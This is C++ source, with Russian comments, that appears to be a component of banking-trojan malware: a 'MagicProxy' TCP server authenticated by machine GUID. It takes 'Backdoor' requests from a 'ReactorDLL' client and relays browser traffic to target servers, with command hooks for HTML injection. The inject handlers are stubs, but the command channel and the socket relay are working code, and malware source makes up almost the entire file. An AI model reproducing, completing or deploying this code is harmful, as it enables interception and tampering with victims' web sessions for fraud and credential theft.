//---------------------------------------------------------------------------

#pragma hdrstop

#include "GetApi.h"
#include "Memory.h"
#include "MagicProxy.h"

//---------------------------------------------------------------------------
#pragma package(smart_init)


//*****************************************************************************
//                                TReactorCommandService
//*****************************************************************************


//-----------------------------------------------------------
//  ProcessCommand
//  Функция обрабатывает команды полученные от библиотеки
//  ReactorDLL
//-----------------------------------------------------------
bool TReactorCommandService::ProcessCommand(BYTE CommandID,
											const string& CommandData,
											string& ResponseData)
{
	switch (CommandID)
	{

		/* Проверка работоспособности сервера */
		case REACTOR_COMMAND_PING: return true;

		/* Запрс количества инжектов для URL */
		case REACTOR_COMMAND_GET_HTMLINJECTS_COUNT:
			return GetHTMLInjectsCount(CommandData, ResponseData);

		/* Команда на выполнение инжектов для URL */
		case REACTOR_COMMAND_EXECUTE_HTMLINJECTS: return false;


	}
	return false;
}



//-----------------------------------------------------------
//  GetHTMLInjectsCount
//  Функция возвращает количество инжектов для указанного URL
//-----------------------------------------------------------
bool TReactorCommandService::GetHTMLInjectsCount(const string& URL, string& Response)
{
	return false;
}






//*****************************************************************************
//                              TMagicProxy
//*****************************************************************************


TMagicProxy::TMagicProxy(const char* IPAddress, WORD Port)
	: TTCPServer(IPAddress, Port)
{
	FRequests = new TProxyRequestCollection();
	// Создаём сервисы прокси
	FCommandService = new TReactorCommandService();
}


TMagicProxy::~TMagicProxy()
{
	delete FCommandService;
	delete FRequests;
}


//-----------------------------------------------------------
//  GetProxyService
//  Функция возвращает класс сервиса по его идентификатору
//-----------------------------------------------------------
TProxyService* TMagicProxy::GetProxyService(BYTE ServiceID)
{
	if (ServiceID == REACTOR_COMMAND_SERVICE)
		return FCommandService;

	return NULL;
}


//-----------------------------------------------------------
//  ValidateRequest
//  Функция проверяет данные авторизации переданные клиентом
//  возвращает истину если запрос был отправлен ReactorDLL
//-----------------------------------------------------------
bool TMagicProxy::ValidateRequest(PROXY_MAGIC_BUFFER *Request)
{
	GUID expectedGUID = Reactor_MachineGUID();
	if (expectedGUID != Request->Auth.MachineUnique)
		return false;

	DWORD crc = (DWORD)pRtlComputeCrc32(0, (const PBYTE)&Request->Auth.MachineUnique,
										sizeof(Request->Auth.MachineUnique));

	crc *= crc * crc;
	return crc == Request->Auth.MachineUniqueCrc32pow3;
}




//-----------------------------------------------------------
//  DoProcessConnection
//  С назначением разберёмся
//-----------------------------------------------------------
void TMagicProxy::DoProcessClient(TTCPClient* Client)
{
	TReactorRequest Request;
	ClearStruct(Request);

	bool Valid = Client->ReceiveData(&Request, sizeof(Request));

	if (!Valid) return;
		

	if (ValidateRequest(&Request))
	{
		DWORD  ResponseCode;
		string ResponseText;

		// Обрабатываем запрос
		ProcessRequest(Client, &Request, ResponseCode, ResponseText);

        // Отправляем ответ клиенту
		MAGIC_RESPONSE_HEADER Response;
		Response.ResponseCode       = ResponseCode;
		Response.ResponseBodyLength = ResponseText.Length();

		// Отправляем заголовок
		Valid = Client->SendData((PCHAR)&Response, sizeof(Response));

		// Отправляем тело
		if (Valid && ResponseText.Length())
		{
        	Client->SendData(ResponseText.t_str(), ResponseText.Length());
        }

    }
}


//-----------------------------------------------------------
//  ProcessRequest
//  Функция обрабатывает запрос и возвращает необходимы
// код  и текст ответа
//-----------------------------------------------------------
void TMagicProxy::ProcessRequest(TTCPClient* Client, PReactorRequest Request, DWORD &ResponseCode, string &ResponseText)
{
	ResponseCode = REACTOR_RESPONSE_NONE;
	ResponseText.Clear();

	// Обрабатываем запрс к прокси сервису
	if (Request->Backdoor.AssociatePort == AssocPort_SvcCall)
	{
		bool Valid = true;

		// Читаем данные команды
		string CommandData;
		if (Request->Backdoor.SizeOfMagicBody)
		{
			CommandData.SetLength(Request->Backdoor.SizeOfMagicBody);
			Valid = Client->ReceiveData(CommandData.t_str(),
										Request->Backdoor.SizeOfMagicBody);
		}

		if (Valid)
		{
			
			TProxyService* Service = GetProxyService(Request->Backdoor.ServiceId);

			Valid = Service != NULL;
			if (Valid)
			{
				// Вызываем обработчик сервиса
				Valid = Service->ProcessCommand(Request->Backdoor.CommandId,
												CommandData, ResponseText);
			}
		}

		if (Valid)
			ResponseCode = REACTOR_RESPONSE_OK;
		else
            ResponseCode = REACTOR_RESPONSE_ERROR;

		return;
	}



	// Добавляем запрс в список
	if (FRequests->Find(Request->Backdoor.ClientTCPPort) == NULL)
	{
		ResponseCode = REACTOR_RESPONSE_OK;
        new TProxyRequest(FRequests, *Request);
    }

}




//*****************************************************************************
//                                   TProxyServer
//*****************************************************************************

TProxyServer::TProxyServer(TMagicProxy &ReactorServer, const char* IPAddress, WORD Port)
	: TTCPServer(IPAddress, Port)
{
	FRequests = ReactorServer.FRequests;
}



//-----------------------------------------------------------
//  DoProcessClient
//  Функция обработки подключения к прокси серверу
//-----------------------------------------------------------
void TProxyServer::DoProcessClient(TTCPClient* Client)
{
	// Ишем запрос
	TProxyRequest* Request = FRequests->Find(Client->Port());
	if (Request)
	{
		Request->SetOwner(NULL);

		// Запускаем петлю обработки данных сокета
		TTCPClient Target;
		Target.SetNonBlocking(true);
		if (Target.Connect(Request->Address, Request->Port))
		{
			// Запускаем петлю пркси
        	ProxyLoop(Client, &Target);
        }

		// Удаляем запрос
		delete Request;
    }
		
}


//-----------------------------------------------------------
//  ProxyLoop
//  Функция "петля" прокси сервера
//  в ней осуществляется прим, передача данных от браузера
//  к конечному серверу с промежуточной обработкой
//-----------------------------------------------------------
void TProxyServer::ProxyLoop(TTCPClient* Client, TTCPClient* Target)
{
	bool CloseConnection = false;

	#ifdef _DEBUG
		// В режиме отладки блокируем петлю
		TLock Locker = FRequests->GetLocker();
	#endif
	//--------------------------------------------------------------

	FD_SET ReadFD;
	FD_SET WriteFD;
	timeval Timeout = MakeTimeval(100);

	DWORD   BufSize = 1023;
	TMemory BufMem(BufSize + 1);
	PCHAR   Buf = BufMem.AsStr();

	SOCKET CS = Client->Socket();
    SOCKET TS = Target->Socket();

	int State;
	int Readden;
	int Written;

	#define CHECK_ERROR(ST) if (ST == SOCKET_ERROR) return

	while (true)
	{
		// Ожидаем готовность сокетов к чтению

		FD_ZERO(&ReadFD);

		FD_SET(  CS, &ReadFD);
		FD_SET(TS, &ReadFD);

		State = select(0, &ReadFD, 0, 0, &Timeout);
		CHECK_ERROR(State);
		if (State == 0) continue;
			

		if (FD_ISSET(CS, &ReadFD))
		{
			// Читаем данные из клиента
			Readden = recv(CS, Buf, BufSize, 0);
			CHECK_ERROR(Readden);

			if (Readden > 0)
			{
				Written = Target->SendDataEx(Buf, Readden, INFINITE);
				CHECK_ERROR(Written);
				if (Written != Readden) break; // Ошибка записи
				continue;
            }
		}


		// Получаем данные от удалённого сервера
		if (FD_ISSET(TS, &ReadFD))
		{
			// Читаем данные из клиента
			Readden = recv(TS, Buf, BufSize, 0);
			CHECK_ERROR(Readden);

			if (Readden >= 0)
			{
				Written = Client->SendDataEx(Buf, Readden, INFINITE);
				CHECK_ERROR(Written);
				if (Written != Readden) return; // Ошибка записи
            }
        }

	}



  /*	while (!CloseConnection)
	{
		// Передаём данные из клиента удалённому серверу
		bool Result1 = TransmitDataBetweenSockets(Client, Target, Buf,
												 CloseConnection, NULL);

		// Читаем данные из удалённого сервера и передаём их клиенту
		bool Result2 = TransmitDataBetweenSockets(Target, Client, Buf,
									   CloseConnection, NULL);
		if (!Result1 && !Result2) break;
	}  */
}


//-----------------------------------------------------------
//  TransmitDataBetweenSockets
//  Функция обменивается данными между сокетами
//
//  Source - Сокет источник.
//  Destination - Сокет приёмник
//  Buf - Буер чтения данных
//  Terminate - Указание прервать обработку этог соединения.
//              (Соиденение было разорвано и др.)
//  DataHandler - Обработчик передаваемых данных
//-----------------------------------------------------------
bool TProxyServer::TransmitDataBetweenSockets(TTCPClient* Source,
					  TTCPClient* Destination, TMemory& Buf,
					  bool &Terminate, LPVOID DataHandler)


{
	int Readden = 0;
	int Written = 0;
	bool Result = true;

	PCHAR ToWrite;
	int   ToWriteSize;

    int TotalWriten = 0;

	do
	{
		Buf.Clear();

		// Читаем порцию данных из источника
		Readden = Source->ReceiveEx(Buf.Buf(), Buf.Size() - 1, INFINITE);

		ToWrite = NULL;
		ToWriteSize = 0;

		if (Readden != SOCKET_ERROR)
		{
			ToWrite = Buf.AsStr();
			ToWriteSize = Readden;

			// Обрабатываем данные

			// Записываем данные
			Written = Destination->SendDataEx(ToWrite, ToWriteSize, INFINITE);

			if (Written != ToWriteSize) return false;

			TotalWriten += Written;
		}
	}
	while (ToWriteSize);

	return TotalWriten != 0;
}



//*****************************************************************************
//                        TProxyRequest
//*****************************************************************************


TProxyRequest::TProxyRequest(TProxyRequestCollection* Owner, TReactorRequest &Request)
	: TBotCollectionItem(NULL)
{
	ClientPort   = htons(Request.Backdoor.ClientTCPPort);
	Port         = htons(Request.Backdoor.AssociatePort);
	Address      = Request.Backdoor.AssociateAddr;
	Transparent  = Request.Backdoor.Transparent;

	SetOwner(Owner);
}



//*****************************************************************************
//                        TProxyRequestCollection
//*****************************************************************************

TProxyRequestCollection::TProxyRequestCollection()
	: TBotCollection()
{
    SetThreadSafe();
}



//-----------------------------------------------------------
//  Find
//  Функция ищет информацию о запросе с указанными параметрами
//-----------------------------------------------------------
TProxyRequest* TProxyRequestCollection::Find(WORD ClientPort)
{
    TProxyRequest* Result = 0;
	Lock();

	for (int i = 0; i < Count(); i++)
	{
		TProxyRequest* Item = (TProxyRequest*)Items(i);

		bool Valid = Item->ClientPort == ClientPort;

		if (Valid)
		{
			Result = Item;
			break;
        }
	}

    Unlock();
	return Result;
}
